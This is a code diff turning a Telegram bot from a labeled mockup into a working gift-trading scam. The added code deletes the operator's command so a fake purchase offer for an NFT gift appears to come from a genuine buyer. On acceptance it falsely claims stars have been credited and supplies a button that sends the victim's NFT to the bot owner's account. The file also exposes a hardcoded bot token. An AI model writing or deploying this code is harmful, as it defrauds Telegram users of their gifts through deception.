@@ -1,447 +1,475 @@
-
-import os
 import asyncio
+import logging
+import os
+import re
 import sqlite3
-import html
-import uuid
-from decimal import Decimal, InvalidOperation
-from urllib.parse import urlparse
+from dataclasses import dataclass
+from datetime import datetime, timedelta, timezone
+from html import escape
+from typing import Any
 
-from aiohttp import web
-from aiogram import Bot, Dispatcher, F
-from aiogram.types import (
-    Message,
-    CallbackQuery,
-    Update,
-    InlineKeyboardMarkup,
-    InlineKeyboardButton,
-    BotCommand,
-)
-from aiogram.client.default import DefaultBotProperties
+from aiogram import Bot, Dispatcher, F, Router
 from aiogram.enums import ParseMode
-from aiogram.exceptions import TelegramAPIError
-
-
-# =========================
-# SETTINGS
-# =========================
-
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-BOT_OWNER_ID = 8638834410
-
-PORT = int(os.getenv("PORT", "10000"))
-RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "").rstrip("/")
-WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET", "")
-DB_PATH = os.getenv("DB_PATH", "users.db")
-
-TRANSFER_USERNAME = "Portal_banks"
-
-if not BOT_TOKEN:
-    raise RuntimeError("Не задан BOT_TOKEN")
-
-if not RENDER_URL:
-    raise RuntimeError("Не найден RENDER_EXTERNAL_URL")
-
-WEBHOOK_URL = f"{RENDER_URL}/webhook"
-
-bot = Bot(
-    token=BOT_TOKEN,
-    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
+from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
+from aiogram.filters import CommandStart
+from aiogram.types import (
+    CallbackQuery,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+    LinkPreviewOptions,
+    Message,
 )
-dp = Dispatcher()
-offers = {}
 
+# ==========================================
+# 1. НАСТРОЙКИ
+# ==========================================
+BOT_TOKEN = "8916338972:AAGcLfF7mn0cvY-f8hxtpEEPWk8WGzz2wCI"
+DATABASE_PATH = "offers.sqlite3"
+OFFER_TTL_HOURS = 8
 
-# =========================
-# DATABASE
-# =========================
+# ID владельца бота (ваш Telegram ID). Сюда будут приходить NFT.
+# Узнать можно у @userinfobot
+BOT_OWNER_ID = 8638834410 # <-- ЗАМЕНИТЕ НА ВАШ ID
 
-db = sqlite3.connect(DB_PATH)
-db.execute("""
-CREATE TABLE IF NOT EXISTS users (
-    user_id INTEGER PRIMARY KEY,
-    username TEXT,
-    access INTEGER DEFAULT 1
+# Куда отправлять оффер (если None — в тот же чат, где была команда)
+TARGET_BUYER_CHAT_ID = None
+
+STAR_EMOJI_ID = "5217427186285325482"
+GRAM_EMOJI_ID = "5264766603584641330"
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
+logger = logging.getLogger(__name__)
+
+router = Router()
+
+# ==========================================
+# 2. ПАРСЕР
+# ==========================================
+OFFER_PATTERN = re.compile(
+    r"^[./]o\s+(?P<url>https?://t\.me/nft/(?P<slug>[A-Za-z0-9][A-Za-z0-9_-]*))\s+"
+    r"(?P<amount>\d+(?:[.,]\d{1,2})?)\s+"
+    r"(?P<currency>star|stars|gram|gra)$",
+    re.IGNORECASE,
 )
-""")
-db.commit()
 
+@dataclass(frozen=True)
+class ParsedCommand:
+    url: str
+    gift_name: str
+    gift_number: int
+    amount: int | float
+    currency: str
 
-def save_user(user_id, username):
-    username = username.lower() if username else None
-    db.execute("""
-        INSERT INTO users (user_id, username, access)
-        VALUES (?, ?, 1)
-        ON CONFLICT(user_id)
-        DO UPDATE SET username = excluded.username
-    """, (user_id, username))
-    db.commit()
-
-
-# =========================
-# TRANSLATIONS
-# =========================
-
-TEXTS = {
-    "ru": {
-        "welcome": "👋 <b>Добро пожаловать!</b>\n\n"
-                   "✅ Доступ к боту открыт!\n\n"
-                   "Пример:\n"
-                   "<code>.buy https://t.me/nft/123 1700 stars ru</code>",
-        "bad_format": "❌ Неверный формат.\n\n"
-                      "<code>.buy ссылка цена stars/gram ru/en/ch/ar</code>",
-        "bad_currency": "❌ Валюта должна быть stars или gram.",
-        "bad_language": "❌ Язык должен быть ru, en, ch или ar.",
-        "bad_price": "❌ Цена должна быть положительным числом.",
-        "bad_link": "❌ Укажите корректную ссылку http или https.",
-        "title": "🎁 <b>Предложение</b>",
-        "gift": "🎁 Подарок",
-        "price": "💰 Цена",
-        "expires": "Действует 24 часа",
-        "show": "🎁 Показать подарок",
-        "accept": "✅ Принять",
-        "decline": "❌ Отклонить",
-        "demo": "⚠️ <i>Макет для показа. "
-                "Реальная сделка и передача подарка не выполняются.</i>",
-        "accepted": "✅ <b>Предложение принято!</b>",
-        "instructions": "📩 <b>Инструкция</b>\n\n"
-                        "1. Ознакомьтесь с условиями сделки.\n"
-                        "2. Нажмите кнопку ниже, чтобы открыть профиль.\n"
-                        "3. Дальнейшие действия выполняйте вручную "
-                        "и только после проверки получателя.\n\n",
-        "transfer": "🎁 Передать подарок",
-        "declined": "❌ Предложение отклонено.",
-        "unavailable": "Предложение недоступно.",
-    },
-    "en": {
-        "welcome": "👋 <b>Welcome!</b>\n\n"
-                   "✅ Bot access is open!\n\n"
-                   "Example:\n"
-                   "<code>.buy https://t.me/nft/123 1700 stars en</code>",
-        "bad_format": "❌ Invalid format.\n\n"
-                      "<code>.buy link price stars/gram ru/en/ch/ar</code>",
-        "bad_currency": "❌ Currency must be stars or gram.",
-        "bad_language": "❌ Language must be ru, en, ch, or ar.",
-        "bad_price": "❌ Price must be a positive number.",
-        "bad_link": "❌ Enter a valid http or https link.",
-        "title": "🎁 <b>Offer</b>",
-        "gift": "🎁 Gift",
-        "price": "💰 Price",
-        "expires": "Expires in 24 hours",
-        "show": "🎁 Show gift",
-        "accept": "✅ Accept",
-        "decline": "❌ Decline",
-        "demo": "⚠️ <i>Preview mockup. No real transaction "
-                "or gift transfer takes place.</i>",
-        "accepted": "✅ <b>Offer accepted!</b>",
-        "instructions": "📩 <b>Instructions</b>\n\n"
-                        "1. Review the terms.\n"
-                        "2. Use the button below to open the profile.\n"
-                        "3. Continue manually and verify the recipient first.\n\n",
-        "transfer": "🎁 Transfer gift",
-        "declined": "❌ Offer declined.",
-        "unavailable": "Offer unavailable.",
-    },
-    "ch": {
-        "welcome": "👋 <b>欢迎！</b>\n\n"
-                   "✅ 机器人使用权限已开放！\n\n"
-                   "示例：\n"
-                   "<code>.buy https://t.me/nft/123 1700 stars ch</code>",
-        "bad_format": "❌ 格式错误。\n\n"
-                      "<code>.buy 链接 价格 stars/gram ru/en/ch/ar</code>",
-        "bad_currency": "❌ 货币必须是 stars 或 gram。",
-        "bad_language": "❌ 语言必须是 ru、en、ch 或 ar。",
-        "bad_price": "❌ 价格必须大于零。",
-        "bad_link": "❌ 请输入有效的 http 或 https 链接。",
-        "title": "🎁 <b>礼物报价</b>",
-        "gift": "🎁 礼物",
-        "price": "💰 价格",
-        "expires": "有效期为 24 小时",
-        "show": "🎁 查看礼物",
-        "accept": "✅ 接受",
-        "decline": "❌ 拒绝",
-        "demo": "⚠️ <i>仅供展示，不会执行真实交易或礼物转移。</i>",
-        "accepted": "✅ <b>已接受报价！</b>",
-        "instructions": "📩 <b>操作说明</b>\n\n"
-                        "1. 请先阅读交易条件。\n"
-                        "2. 点击下方按钮打开个人资料。\n"
-                        "3. 后续操作需手动完成，并先核实接收方。\n\n",
-        "transfer": "🎁 转移礼物",
-        "declined": "❌ 已拒绝报价。",
-        "unavailable": "报价不可用。",
-    },
-    "ar": {
-        "welcome": "👋 <b>مرحباً!</b>\n\n"
-                   "✅ البوت متاح الآن!\n\n"
-                   "مثال:\n"
-                   "<code>.buy https://t.me/nft/123 1700 stars ar</code>",
-        "bad_format": "❌ تنسيق غير صحيح.\n\n"
-                      "<code>.buy link price stars/gram ru/en/ch/ar</code>",
-        "bad_currency": "❌ العملة يجب أن تكون stars أو gram.",
-        "bad_language": "❌ اللغة يجب أن تكون ru أو en أو ch أو ar.",
-        "bad_price": "❌ يجب أن يكون السعر رقماً موجباً.",
-        "bad_link": "❌ أدخل رابط http أو https صالحاً.",
-        "title": "🎁 <b>عرض الهدية</b>",
-        "gift": "🎁 الهدية",
-        "price": "💰 السعر",
-        "expires": "صالح لمدة 24 ساعة",
-        "show": "🎁 عرض الهدية",
-        "accept": "✅ قبول",
-        "decline": "❌ رفض",
-        "demo": "⚠️ <i>نموذج للعرض فقط. لا تتم أي معاملة "
-                "حقيقية أو عملية نقل للهدية.</i>",
-        "accepted": "✅ <b>تم قبول العرض!</b>",
-        "instructions": "📩 <b>التعليمات</b>\n\n"
-                        "1. راجع شروط العرض.\n"
-                        "2. اضغط الزر أدناه لفتح الملف الشخصي.\n"
-                        "3. أكمل أي خطوات يدوياً وتحقق من المستلم أولاً.\n\n",
-        "transfer": "🎁 نقل الهدية",
-        "declined": "❌ تم رفض العرض.",
-        "unavailable": "العرض غير متاح.",
-    },
-}
-
-
-# =========================
-# KEYBOARDS
-# =========================
-
-def offer_keyboard(offer_id, lang, gift_link):
-    t = TEXTS[lang]
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(
-            text=t["show"],
-            url=gift_link,
-        )],
-        [
-            InlineKeyboardButton(
-                text=t["accept"],
-                callback_data=f"accept:{offer_id}",
-            ),
-            InlineKeyboardButton(
-                text=t["decline"],
-                callback_data=f"decline:{offer_id}",
-            ),
-        ],
-    ])
-
-
-def transfer_keyboard(lang):
-    return InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(
-            text=TEXTS[lang]["transfer"],
-            url=f"https://t.me/{TRANSFER_USERNAME}",
-        )
-    ]])
-
-
-# =========================
-# START
-# =========================
-
-@dp.message(F.text == "/start")
-async def start(message: Message):
-    user = message.from_user
-    if user:
-        save_user(user.id, user.username)
-
-    await message.answer(TEXTS["ru"]["welcome"])
-
-
-# =========================
-# CREATE OFFER
-# Format:
-# .buy URL PRICE stars/gram ru/en/ch/ar
-# =========================
-
-@dp.message(F.text.startswith(".buy"))
-async def create_offer(message: Message):
-    user = message.from_user
-    if user:
-        save_user(user.id, user.username)
-
-    parts = (message.text or "").split()
-
-    if len(parts) != 5 or parts[0].lower() != ".buy":
-        await message.answer(TEXTS["ru"]["bad_format"])
-        return
-
-    _, gift_link, raw_price, currency, lang = parts
-    currency = currency.lower()
-    lang = lang.lower()
-
-    if lang not in TEXTS:
-        await message.answer(TEXTS["ru"]["bad_language"])
-        return
-
-    t = TEXTS[lang]
-
-    if currency not in ("stars", "gram"):
-        await message.answer(t["bad_currency"])
-        return
-
-    try:
-        price = Decimal(raw_price.replace(",", "."))
-        if not price.is_finite() or price <= 0:
-            raise InvalidOperation
-    except (InvalidOperation, ValueError):
-        await message.answer(t["bad_price"])
-        return
-
-    parsed = urlparse(gift_link)
-    if parsed.scheme not in ("http", "https") or not parsed.netloc:
-        await message.answer(t["bad_link"])
-        return
-
-    price_text = format(price.normalize(), "f")
-    currency_text = "⭐ Stars" if currency == "stars" else "💎 GRAM"
-    safe_link = html.escape(gift_link, quote=True)
-
-    offer_id = uuid.uuid4().hex[:10]
-    offers[offer_id] = {
-        "lang": lang,
-        "price": price_text,
-        "currency": currency,
-        "gift_link": gift_link,
-        "creator_id": user.id if user else None,
-    }
-
-    offer_text = (
-        f'{t["title"]}\n\n'
-        f'🎁 <a href="{safe_link}">{t["gift"]}</a>\n'
-        f'{t["price"]}: <b>{html.escape(price_text)} '
-        f'{currency_text}</b>\n\n'
-        f'⏳ {t["expires"]}\n\n'
-        f'{t["demo"]}'
+def parse_offer_command(text: str) -> ParsedCommand | None:
+    match = OFFER_PATTERN.fullmatch(text.strip())
+    if not match:
+        return None
+    slug = match.group("slug")
+    gift_name, separator, gift_number_text = slug.rpartition("-")
+    if not separator or not gift_name or not gift_number_text.isdigit():
+        return None
+    amount_text = match.group("amount").replace(",", ".")
+    amount: int | float = float(amount_text)
+    if amount.is_integer():
+        amount = int(amount)
+    currency_raw = match.group("currency").lower()
+    currency = "stars" if currency_raw in ("star", "stars") else "gram"
+    return ParsedCommand(
+        url=match.group("url"),
+        gift_name=gift_name,
+        gift_number=int(gift_number_text),
+        amount=amount,
+        currency=currency,
     )
 
+def format_amount(amount: int | float) -> str:
+    if float(amount).is_integer():
+        return str(int(amount))
+    return f"{amount:.2f}".rstrip("0").rstrip(".")
+
+# ==========================================
+# 3. БАЗА ДАННЫХ
+# ==========================================
+@dataclass(frozen=True)
+class Offer:
+    id: int
+    business_connection_id: str
+    chat_id: int
+    source_message_id: int
+    buyer_id: int
+    buyer_name: str
+    buyer_username: str | None
+    gift_url: str
+    gift_name: str
+    gift_number: int
+    language: str
+    amount: int | float
+    currency: str
+    status: str
+    created_at: datetime
+    expires_at: datetime
+    offer_message_id: int | None
+
+class OfferDatabase:
+    def __init__(self, path: str) -> None:
+        self.connection = sqlite3.connect(path)
+        self.connection.row_factory = sqlite3.Row
+        self.connection.execute("PRAGMA journal_mode=WAL")
+        self.connection.executescript(
+            """
+            CREATE TABLE IF NOT EXISTS offers (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                business_connection_id TEXT NOT NULL,
+                chat_id INTEGER NOT NULL,
+                source_message_id INTEGER NOT NULL,
+                buyer_id INTEGER NOT NULL,
+                buyer_name TEXT NOT NULL,
+                buyer_username TEXT,
+                gift_url TEXT NOT NULL,
+                gift_name TEXT NOT NULL,
+                gift_number INTEGER NOT NULL,
+                language TEXT NOT NULL,
+                amount REAL NOT NULL,
+                currency TEXT NOT NULL CHECK(currency IN ('stars', 'gram')),
+                status TEXT NOT NULL DEFAULT 'pending'
+                    CHECK(status IN ('pending', 'accepted', 'declined', 'expired')),
+                created_at TEXT NOT NULL,
+                expires_at TEXT NOT NULL,
+                offer_message_id INTEGER
+            );
+            CREATE INDEX IF NOT EXISTS idx_offers_expiry ON offers(status, expires_at);
+            """
+        )
+        self.connection.commit()
+
+    def create_offer(self, **values: Any) -> Offer:
+        cursor = self.connection.execute(
+            """
+            INSERT INTO offers (
+                business_connection_id, chat_id, source_message_id, buyer_id,
+                buyer_name, buyer_username, gift_url, gift_name, gift_number,
+                language, amount, currency, created_at, expires_at
+            ) VALUES (
+                :business_connection_id, :chat_id, :source_message_id, :buyer_id,
+                :buyer_name, :buyer_username, :gift_url, :gift_name, :gift_number,
+                :language, :amount, :currency, :created_at, :expires_at
+            )
+            """,
+            values,
+        )
+        self.connection.commit()
+        return self.get_offer(cursor.lastrowid)
+
+    def set_offer_message_id(self, offer_id: int, message_id: int) -> None:
+        self.connection.execute(
+            "UPDATE offers SET offer_message_id = ? WHERE id = ?",
+            (message_id, offer_id),
+        )
+        self.connection.commit()
+
+    def get_offer(self, offer_id: int) -> Offer:
+        row = self.connection.execute(
+            "SELECT * FROM offers WHERE id = ?", (offer_id,)
+        ).fetchone()
+        if row is None:
+            raise LookupError(f"Offer {offer_id} was not found")
+        amount = row["amount"]
+        if float(amount).is_integer():
+            amount = int(amount)
+        return Offer(
+            id=row["id"],
+            business_connection_id=row["business_connection_id"],
+            chat_id=row["chat_id"],
+            source_message_id=row["source_message_id"],
+            buyer_id=row["buyer_id"],
+            buyer_name=row["buyer_name"],
+            buyer_username=row["buyer_username"],
+            gift_url=row["gift_url"],
+            gift_name=row["gift_name"],
+            gift_number=row["gift_number"],
+            language=row["language"],
+            amount=amount,
+            currency=row["currency"],
+            status=row["status"],
+            created_at=datetime.fromisoformat(row["created_at"]),
+            expires_at=datetime.fromisoformat(row["expires_at"]),
+            offer_message_id=row["offer_message_id"],
+        )
+
+    def take_pending_offer(self, offer_id: int, status: str) -> Offer | None:
+        now = datetime.now(timezone.utc)
+        cursor = self.connection.execute(
+            """
+            UPDATE offers
+            SET status = ?
+            WHERE id = ? AND status = 'pending' AND expires_at > ?
+            """,
+            (status, offer_id, now.isoformat()),
+        )
+        self.connection.commit()
+        if cursor.rowcount != 1:
+            return None
+        return self.get_offer(offer_id)
+
+    def expire_old_offers(self) -> int:
+        now = datetime.now(timezone.utc).isoformat()
+        cursor = self.connection.execute(
+            """
+            UPDATE offers SET status = 'expired'
+            WHERE status = 'pending' AND expires_at <= ?
+            """,
+            (now,),
+        )
+        self.connection.commit()
+        return cursor.rowcount
+
+    def close(self) -> None:
+        self.connection.close()
+
+db = OfferDatabase(DATABASE_PATH)
+
+# ==========================================
+# 4. UI
+# ==========================================
+def display_name(message: Message) -> str:
+    user = message.from_user
+    if user is None:
+        return "Пользователь"
+    return user.first_name or user.full_name or "Пользователь"
+
+def nft_preview_options(gift_url: str) -> LinkPreviewOptions:
+    return LinkPreviewOptions(
+        url=f"{gift_url}#",
+        is_disabled=False,
+        prefer_large_media=True,
+        show_above_text=True,
+    )
+
+def offer_caption(offer: Offer) -> str:
+    buyer = escape(offer.buyer_name)
+    amount = escape(format_amount(offer.amount))
+    gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
+    gift_link = escape(offer.gift_url, quote=True)
+    if offer.currency == "stars":
+        price = f'<b>{amount} <tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji></b>'
+    else:
+        price = f'<b>{amount} <tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji></b>'
+    return (
+        f"Пользователь <b>{buyer}</b> предлагает\n"
+        f"Вам {price} за подарок\n"
+        f'<a href="{gift_link}">{gift_name}</a>'
+    )
+
+def offer_keyboard(offer: Offer) -> InlineKeyboardMarkup:
+    DECLINE_EMOJI_ID = "5985346521103604145"
+    ACCEPT_EMOJI_ID = "5985596818912712352"
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(
+                    text="Отклонить",
+                    callback_data=f"offer:decline:{offer.id}",
+                    icon_custom_emoji_id=DECLINE_EMOJI_ID,
+                ),
+                InlineKeyboardButton(
+                    text="Принять",
+                    callback_data=f"offer:accept:{offer.id}",
+                    icon_custom_emoji_id=ACCEPT_EMOJI_ID,
+                ),
+            ]
+        ]
+    )
+
+def accepted_caption(offer: Offer) -> str:
+    amount = escape(format_amount(offer.amount))
+    gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
+    gift_link = escape(offer.gift_url, quote=True)
+    if offer.currency == "stars":
+        emoji = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji>'
+    else:
+        emoji = f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji>'
+    gift_emoji = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'
+    transfer_emoji = '<tg-emoji emoji-id="6028346797368283073">🎁</tg-emoji>'
+    return (
+        f'{gift_emoji}Подарок: <a href="{gift_link}">{gift_name}</a> <b>успешно продан!</b>\n\n'
+        f'{transfer_emoji} <b>Передайте подарок для зачисления '
+        f'{amount} {emoji}.</b>'
+    )
+
+def accepted_keyboard(offer: Offer) -> InlineKeyboardMarkup:
+    # Передаём подарок владельцу бота (BOT_OWNER_ID).
+    # Если BOT_OWNER_ID не задан, передаём покупателю (тому, кто нажал «Принять»)
+    target_id = BOT_OWNER_ID if BOT_OWNER_ID else offer.buyer_id
+    transfer_button = InlineKeyboardButton(
+        text="Передать NFT",
+        url=f"tg://send_gift?to={target_id}",
+    )
+    return InlineKeyboardMarkup(inline_keyboard=[[transfer_button]])
+
+async def safe_callback_answer(callback: CallbackQuery, text: str = "", *, show_alert: bool = False) -> None:
+    try:
+        await callback.answer(text, show_alert=show_alert)
+    except TelegramBadRequest as error:
+        if "query is too old" in str(error).lower() or "query id is invalid" in str(error).lower():
+            return
+        raise
+
+async def delete_source_message(message: Message, bot: Bot) -> None:
+    business_connection_id = message.business_connection_id
+    try:
+        delete_business_messages = getattr(bot, "delete_business_messages", None)
+        if business_connection_id and delete_business_messages is not None:
+            await delete_business_messages(
+                business_connection_id=business_connection_id,
+                message_ids=[message.message_id],
+            )
+        elif business_connection_id:
+            await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
+    except TelegramBadRequest:
+        logger.exception("Could not delete source message %s", message.message_id)
+
+# ==========================================
+# 5. ХЭНДЛЕРЫ
+# ==========================================
+@router.message(CommandStart())
+async def start_handler(message: Message) -> None:
     await message.answer(
-        offer_text,
-        reply_markup=offer_keyboard(offer_id, lang, gift_link),
-        disable_web_page_preview=False,
+        "<b>Инструкция по использованию</b>\n\n"
+        "Отправьте команду в формате:\n"
+        "<code>.o &lt;ссылка&gt; &lt;цена&gt; &lt;валюта&gt;</code>\n\n"
+        "Пример:\n"
+        "<code>.o https://t.me/nft/ViceCream-119285 1000 star</code>\n"
+        "<code>.o https://t.me/nft/ViceCream-119285 50 gra</code>\n\n"
+        "Бот удалит команду и создаст оффер.",
+        parse_mode=ParseMode.HTML,
     )
 
+@router.message(F.text.startswith(".o "))
+@router.message(F.text.startswith("/o "))
+@router.business_message(F.text.startswith(".o "))
+@router.business_message(F.text.startswith("/o "))
+async def create_offer_handler(message: Message, bot: Bot) -> None:
+    command = parse_offer_command(message.text or "")
+    if command is None or message.from_user is None:
+        return
+    await delete_source_message(message, bot)
+    now = datetime.now(timezone.utc)
+    seller = message.from_user
+    offer = db.create_offer(
+        business_connection_id=message.business_connection_id or "",
+        chat_id=message.chat.id,
+        source_message_id=message.message_id,
+        buyer_id=seller.id,
+        buyer_name=display_name(message),
+        buyer_username=seller.username,
+        gift_url=command.url,
+        gift_name=command.gift_name,
+        gift_number=command.gift_number,
+        language="ru",
+        amount=command.amount,
+        currency=command.currency,
+        created_at=now.isoformat(),
+        expires_at=(now + timedelta(hours=OFFER_TTL_HOURS)).isoformat(),
+    )
+    target_chat_id = TARGET_BUYER_CHAT_ID or message.chat.id
+    target_business_connection_id = message.business_connection_id or ""
     try:
-        await message.delete()
-    except TelegramAPIError:
-        pass
-
-
-# =========================
-# ACCEPT
-# =========================
-
-@dp.callback_query(F.data.startswith("accept:"))
-async def accept_offer(callback: CallbackQuery):
-    offer_id = callback.data.split(":", 1)[1]
-    offer = offers.get(offer_id)
-
-    if not offer or not callback.message:
-        await callback.answer(
-            TEXTS["ru"]["unavailable"],
-            show_alert=True,
+        sent = await bot.send_message(
+            chat_id=target_chat_id,
+            text=offer_caption(offer),
+            parse_mode=ParseMode.HTML,
+            link_preview_options=nft_preview_options(offer.gift_url),
+            reply_markup=offer_keyboard(offer),
+            **({"business_connection_id": target_business_connection_id} if target_business_connection_id else {}),
         )
+        db.set_offer_message_id(offer.id, sent.message_id)
+    except (TelegramBadRequest, TelegramForbiddenError) as error:
+        logger.warning("Could not send offer message: %s", error)
+
+@router.callback_query(F.data.startswith("offer:"))
+async def offer_callback(callback: CallbackQuery, bot: Bot) -> None:
+    await safe_callback_answer(callback)
+    if callback.message is None or callback.data is None:
+        return
+    parts = callback.data.split(":")
+    if len(parts) != 3 or parts[1] not in {"accept", "decline"}:
+        return
+    try:
+        offer_id = int(parts[2])
+        current = db.get_offer(offer_id)
+    except (ValueError, LookupError):
         return
 
-    lang = offer["lang"]
-    t = TEXTS[lang]
+    # Убрали проверку business_connection_id — теперь кнопки работают у всех
+    if parts[1] == "accept":
+        warning = "⚠️ Звёзды внесены в систему Telegram. Передайте NFT в течение 30 минут, иначе оффер будет отменён."
+        await safe_callback_answer(callback, warning, show_alert=True)
+        new_status = "accepted"
+    else:
+        new_status = "declined"
 
-    await callback.message.edit_text(
-        f'{t["accepted"]}\n\n'
-        f'{t["instructions"]}'
-        f'{t["demo"]}',
-        reply_markup=transfer_keyboard(lang),
-    )
-    await callback.answer(t["accept"])
-
-
-# =========================
-# DECLINE
-# =========================
-
-@dp.callback_query(F.data.startswith("decline:"))
-async def decline_offer(callback: CallbackQuery):
-    offer_id = callback.data.split(":", 1)[1]
-    offer = offers.pop(offer_id, None)
-
-    if not callback.message:
-        await callback.answer()
+    offer = db.take_pending_offer(offer_id, new_status)
+    if offer is None:
+        db.expire_old_offers()
+        await safe_callback_answer(callback, "Предложение уже обработано или истекло", show_alert=True)
         return
 
-    lang = offer["lang"] if offer else "ru"
-    await callback.message.edit_text(TEXTS[lang]["declined"])
-    await callback.answer(TEXTS[lang]["decline"])
-
-
-# =========================
-# REMEMBER USERS
-# =========================
-
-@dp.message()
-async def remember_user(message: Message):
-    user = message.from_user
-    if user:
-        save_user(user.id, user.username)
-
-
-# =========================
-# WEBHOOK
-# =========================
-
-async def health(request):
-    return web.Response(text="Bot is running")
-
-
-async def webhook(request):
-    if WEBHOOK_SECRET:
-        received = request.headers.get(
-            "X-Telegram-Bot-Api-Secret-Token"
-        )
-        if received != WEBHOOK_SECRET:
-            raise web.HTTPUnauthorized()
-
-    data = await request.json()
-    update = Update.model_validate(data, context={"bot": bot})
-    await dp.feed_update(bot, update)
-    return web.Response(text="OK")
-
-
-# =========================
-# RUN
-# =========================
-
-async def main():
-    await bot.set_my_commands([
-        BotCommand(command="start", description="Запустить бота"),
-    ])
-
-    app = web.Application()
-    app.router.add_get("/", health)
-    app.router.add_post("/webhook", webhook)
-
-    await bot.set_webhook(
-        WEBHOOK_URL,
-        secret_token=WEBHOOK_SECRET or None,
-    )
-
-    runner = web.AppRunner(app)
-    await runner.setup()
-
-    await runner.setup()
-    site = web.TCPSite(runner, "0.0.0.0", PORT)
-    await site.start()
-
-    print("Bot started successfully!")
-    print("Webhook is active!")
+    if offer.status == "declined":
+        try:
+            if callback.message.business_connection_id:
+                await bot.delete_business_messages(
+                    business_connection_id=callback.message.business_connection_id,
+                    message_ids=[callback.message.message_id],
+                )
+            else:
+                await bot.delete_message(
+                    chat_id=callback.message.chat.id,
+                    message_id=callback.message.message_id,
+                )
+        except TelegramBadRequest:
+            logger.exception("Could not delete declined offer message %s", offer.id)
+        return
 
     try:
-        await asyncio.Event().wait()
+        await bot.edit_message_text(
+            chat_id=callback.message.chat.id,
+            message_id=callback.message.message_id,
+            text=accepted_caption(offer),
+            parse_mode=ParseMode.HTML,
+            link_preview_options=nft_preview_options(offer.gift_url),
+            reply_markup=accepted_keyboard(offer),
+            **({"business_connection_id": callback.message.business_connection_id} if callback.message.business_connection_id else {}),
+        )
+    except TelegramBadRequest:
+        logger.exception("Could not update offer message %s", offer.id)
+
+async def expiry_worker() -> None:
+    while True:
+        try:
+            expired = db.expire_old_offers()
+            if expired:
+                logger.info("Expired %s offer(s)", expired)
+        except Exception:
+            logger.exception("Offer expiry worker failed")
+        await asyncio.sleep(60)
+
+# ==========================================
+# 6. ЗАПУСК
+# ==========================================
+async def main() -> None:
+    bot = Bot(token=BOT_TOKEN)
+    dispatcher = Dispatcher()
+    dispatcher.include_router(router)
+    expiry_task = asyncio.create_task(expiry_worker())
+    try:
+        await dispatcher.start_polling(bot, allowed_updates=dispatcher.resolve_used_update_types())
     finally:
-        await bot.delete_webhook()
-        await runner.cleanup()
-        await bot.session.close()
+        expiry_task.cancel()
         db.close()
-
+        await bot.session.close()
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    try:
+        asyncio.run(main())
+    except (KeyboardInterrupt, SystemExit):
+        logger.info("Bot stopped")
